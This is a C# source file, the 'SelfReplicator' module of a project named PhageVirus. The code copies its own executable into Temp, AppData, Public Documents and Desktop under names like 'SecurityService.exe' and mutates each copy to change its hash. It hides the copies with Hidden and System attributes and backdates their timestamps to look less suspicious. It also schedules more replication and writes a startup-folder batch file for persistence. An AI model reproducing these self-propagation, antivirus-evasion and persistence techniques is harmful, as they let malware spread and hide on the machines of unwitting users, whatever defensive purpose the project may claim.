using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace PhageVirus.Modules
{
    public class SelfReplicator
    {
        private static readonly string[] ReplicationTargets = {
            @"C:\Windows\Temp",
            @"C:\Users\Public\Documents",
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        };

        private static readonly string[] ReplicationNames = {
            "PhageVirus.exe",
            "SystemMonitor.exe",
            "SecurityService.exe",
            "PhageNodeA.exe",
            "MonitorNode.exe",
            "ReplicaClient.exe",
            "SecurityAgent.exe"
        };

        private static readonly string PhageSignature = "PHAGE_VIRUS_SIGNATURE_v1.0";
        
        // Optimization: Limit replication to reduce resource usage
        private static readonly int MaxReplicas = 1;
        private static int currentReplicaCount = 0;
        private static bool replicationEnabled = true;

        public static bool Replicate()
        {
            try
            {
                // Check replication limits
                if (!replicationEnabled || currentReplicaCount >= MaxReplicas)
                {
                    EnhancedLogger.LogInfo($"Replication skipped - limit reached ({currentReplicaCount}/{MaxReplicas})");
                    return false;
                }

                EnhancedLogger.LogInfo("Starting optimized self-replication sequence...");

                var currentExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                if (string.IsNullOrEmpty(currentExePath))
                {
                    EnhancedLogger.LogError("Cannot determine current executable path");
                    return false;
                }

                var replicationCount = 0;
                var random = new Random();

                // Only replicate to one target to reduce resource usage
                var targetDir = ReplicationTargets[random.Next(ReplicationTargets.Length)];
                
                try
                {
                    if (Directory.Exists(targetDir))
                    {
                        // Choose a random name for this replication
                        var fileName = ReplicationNames[random.Next(ReplicationNames.Length)];
                        var targetPath = Path.Combine(targetDir, fileName);

                        // Skip if already exists (avoid overwriting)
                        if (!File.Exists(targetPath))
                        {
                            // Create mutated copy
                            if (CreateMutatedCopy(currentExePath, targetPath))
                            {
                                replicationCount++;
                                currentReplicaCount++;
                                EnhancedLogger.LogSuccess($"Replicated to: {targetPath}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    EnhancedLogger.LogWarning($"Failed to replicate to {targetDir}: {ex.Message}");
                }

                EnhancedLogger.LogInfo($"Optimized self-replication complete. Created {replicationCount} copy.");
                
                // Send telemetry to cloud for self-replication status
                Task.Run(async () =>
                {
                    try
                    {
                        var replicationData = new
                        {
                            replication_targets_count = ReplicationTargets.Length,
                            replication_names_count = ReplicationNames.Length,
                            current_replica_count = currentReplicaCount,
                            max_replicas = MaxReplicas,
                            replication_enabled = replicationEnabled,
                            replication_count = replicationCount,
                            threat_type = "self_replication",
                            timestamp = DateTime.UtcNow
                        };

                        await CloudIntegration.SendTelemetryAsync("SelfReplicator", "self_replication", replicationData, ThreatLevel.Normal);
                        
                        // Get cloud self-replication analysis
                        var analysis = await CloudIntegration.GetCloudAnalysisAsync("SelfReplicator", replicationData);
                        if (analysis.Success)
                        {
                            EnhancedLogger.LogInfo($"Cloud self-replication analysis: {analysis.Analysis}");
                        }
                    }
                    catch (Exception ex)
                    {
                        EnhancedLogger.LogWarning($"Cloud self-replication analysis failed: {ex.Message}");
                    }
                });
                
                return replicationCount > 0;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogError($"Self-replication failed: {ex.Message}");
                return false;
            }
        }

        private static bool CreateMutatedCopy(string sourcePath, string targetPath)
        {
            try
            {
                // Read the original executable
                var originalBytes = File.ReadAllBytes(sourcePath);
                
                // Create a mutated version
                var mutatedBytes = MutateExecutable(originalBytes);
                
                // Write the mutated copy
                File.WriteAllBytes(targetPath, mutatedBytes);
                
                // Set file attributes to make it less suspicious
                File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
                
                // Optionally set creation time to match system files
                var random = new Random();
                var systemTime = DateTime.Now.AddDays(-random.Next(30, 365));
                File.SetCreationTime(targetPath, systemTime);
                File.SetLastWriteTime(targetPath, systemTime);
                
                return true;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogWarning($"Failed to create mutated copy: {ex.Message}");
                return false;
            }
        }

        private static byte[] MutateExecutable(byte[] originalBytes)
        {
            try
            {
                // Create a copy to mutate
                var mutatedBytes = new byte[originalBytes.Length];
                Array.Copy(originalBytes, mutatedBytes, originalBytes.Length);

                // Find and modify the signature to create a unique variant
                var signatureBytes = Encoding.UTF8.GetBytes(PhageSignature);
                var signatureIndex = FindPattern(mutatedBytes, signatureBytes);
                
                if (signatureIndex >= 0)
                {
                    // Modify the signature slightly to create a unique variant
                    var random = new Random();
                    var mutationToken = random.Next(1000, 9999).ToString();
                    var newSignature = $"{PhageSignature}_{mutationToken}";
                    var newSignatureBytes = Encoding.UTF8.GetBytes(newSignature);
                    
                    // Replace the signature
                    if (signatureIndex + newSignatureBytes.Length <= mutatedBytes.Length)
                    {
                        Array.Copy(newSignatureBytes, 0, mutatedBytes, signatureIndex, newSignatureBytes.Length);
                    }
                }

                // Add some random padding to change file hash
                var paddingSize = new Random().Next(1, 100);
                var newBytes = new byte[mutatedBytes.Length + paddingSize];
                Array.Copy(mutatedBytes, newBytes, mutatedBytes.Length);
                
                // Fill padding with random bytes
                var randomBytes = new byte[paddingSize];
                new Random().NextBytes(randomBytes);
                Array.Copy(randomBytes, 0, newBytes, mutatedBytes.Length, paddingSize);
                
                return newBytes;
            }
            catch
            {
                // If mutation fails, return original
                return originalBytes;
            }
        }

        private static int FindPattern(byte[] data, byte[] pattern)
        {
            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        found = false;
                        break;
                    }
                }
                if (found) return i;
            }
            return -1;
        }

        public static bool CleanupOldCopies()
        {
            try
            {
                EnhancedLogger.LogInfo("Cleaning up old PhageVirus copies...");
                
                var cleanupCount = 0;
                var currentExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var currentHash = CalculateFileHash(currentExePath);

                foreach (var targetDir in ReplicationTargets)
                {
                    try
                    {
                        if (!Directory.Exists(targetDir))
                            continue;

                        var files = Directory.GetFiles(targetDir, "*.exe");
                        foreach (var file in files)
                        {
                            try
                            {
                                // Check if this is a PhageVirus copy
                                if (IsPhageVirusCopy(file, currentHash))
                                {
                                    File.Delete(file);
                                    cleanupCount++;
                                    EnhancedLogger.LogInfo($"Cleaned up: {file}");
                                }
                            }
                            catch (Exception ex)
                            {
                                EnhancedLogger.LogWarning($"Failed to clean up {file}: {ex.Message}");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        EnhancedLogger.LogWarning($"Failed to scan {targetDir} for cleanup: {ex.Message}");
                    }
                }

                EnhancedLogger.LogInfo($"Cleanup complete. Removed {cleanupCount} old copies.");
                return true;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogError($"Cleanup failed: {ex.Message}");
                return false;
            }
        }

        private static bool IsPhageVirusCopy(string filePath, string currentHash)
        {
            try
            {
                // Skip the current executable
                if (filePath.Equals(System.Reflection.Assembly.GetExecutingAssembly().Location, StringComparison.OrdinalIgnoreCase))
                    return false;

                // Check file size (should be similar)
                var fileInfo = new FileInfo(filePath);
                var currentInfo = new FileInfo(System.Reflection.Assembly.GetExecutingAssembly().Location);
                
                if (Math.Abs(fileInfo.Length - currentInfo.Length) > 1000) // Allow some variation due to mutation
                    return false;

                // Check if file contains our signature
                var fileBytes = File.ReadAllBytes(filePath);
                var signatureBytes = Encoding.UTF8.GetBytes(PhageSignature);
                
                return FindPattern(fileBytes, signatureBytes) >= 0;
            }
            catch
            {
                return false;
            }
        }

        private static string CalculateFileHash(string filePath)
        {
            try
            {
                using (var sha256 = SHA256.Create())
                using (var stream = File.OpenRead(filePath))
                {
                    var hash = sha256.ComputeHash(stream);
                    return Convert.ToBase64String(hash);
                }
            }
            catch
            {
                return "";
            }
        }

        public static bool ScheduleReplication(int delayMinutes = 30)
        {
            try
            {
                EnhancedLogger.LogInfo($"Scheduling replication in {delayMinutes} minutes...");
                
                var timer = new Timer(_ =>
                {
                    Replicate();
                }, null, delayMinutes * 60 * 1000, Timeout.Infinite);
                
                return true;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogError($"Failed to schedule replication: {ex.Message}");
                return false;
            }
        }

        public static List<string> GetReplicationLocations()
        {
            var locations = new List<string>();
            
            foreach (var targetDir in ReplicationTargets)
            {
                try
                {
                    if (Directory.Exists(targetDir))
                    {
                        var files = Directory.GetFiles(targetDir, "*.exe");
                        foreach (var file in files)
                        {
                            if (IsPhageVirusCopy(file, ""))
                            {
                                locations.Add(file);
                            }
                        }
                    }
                }
                catch
                {
                    // Ignore inaccessible directories
                }
            }
            
            return locations;
        }

        public static bool CreatePersistence()
        {
            try
            {
                EnhancedLogger.LogInfo("Creating persistence mechanisms...");
                
                var currentExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "PhageVirus.lnk");
                
                // Create shortcut in startup folder
                CreateShortcut(currentExePath, startupPath);
                
                // Create registry entry for persistence
                CreateRegistryPersistence(currentExePath);
                
                EnhancedLogger.LogSuccess("Persistence mechanisms created successfully");
                return true;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogError($"Persistence creation failed: {ex.Message}");
                return false;
            }
        }

        private static void CreateShortcut(string targetPath, string shortcutPath)
        {
            try
            {
                // Create a simple batch file as a fallback
                var batchPath = Path.ChangeExtension(shortcutPath, ".bat");
                var batchContent = $@"@echo off
start """" ""{targetPath}""
";
                File.WriteAllText(batchPath, batchContent);
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogWarning($"Failed to create shortcut: {ex.Message}");
            }
        }

        private static void CreateRegistryPersistence(string exePath)
        {
            try
            {
                // This would require registry access - simplified for demo
                EnhancedLogger.LogInfo("Registry persistence would be created here (requires elevated privileges)");
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogWarning($"Failed to create registry persistence: {ex.Message}");
            }
        }

        public static bool RemovePersistence()
        {
            try
            {
                EnhancedLogger.LogInfo("Removing persistence mechanisms...");
                
                var startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "PhageVirus.lnk");
                var batchPath = Path.ChangeExtension(startupPath, ".bat");
                
                if (File.Exists(startupPath))
                    File.Delete(startupPath);
                    
                if (File.Exists(batchPath))
                    File.Delete(batchPath);
                
                EnhancedLogger.LogSuccess("Persistence mechanisms removed successfully");
                return true;
            }
            catch (Exception ex)
            {
                EnhancedLogger.LogError($"Persistence removal failed: {ex.Message}");
                return false;
            }
        }
    }
} 
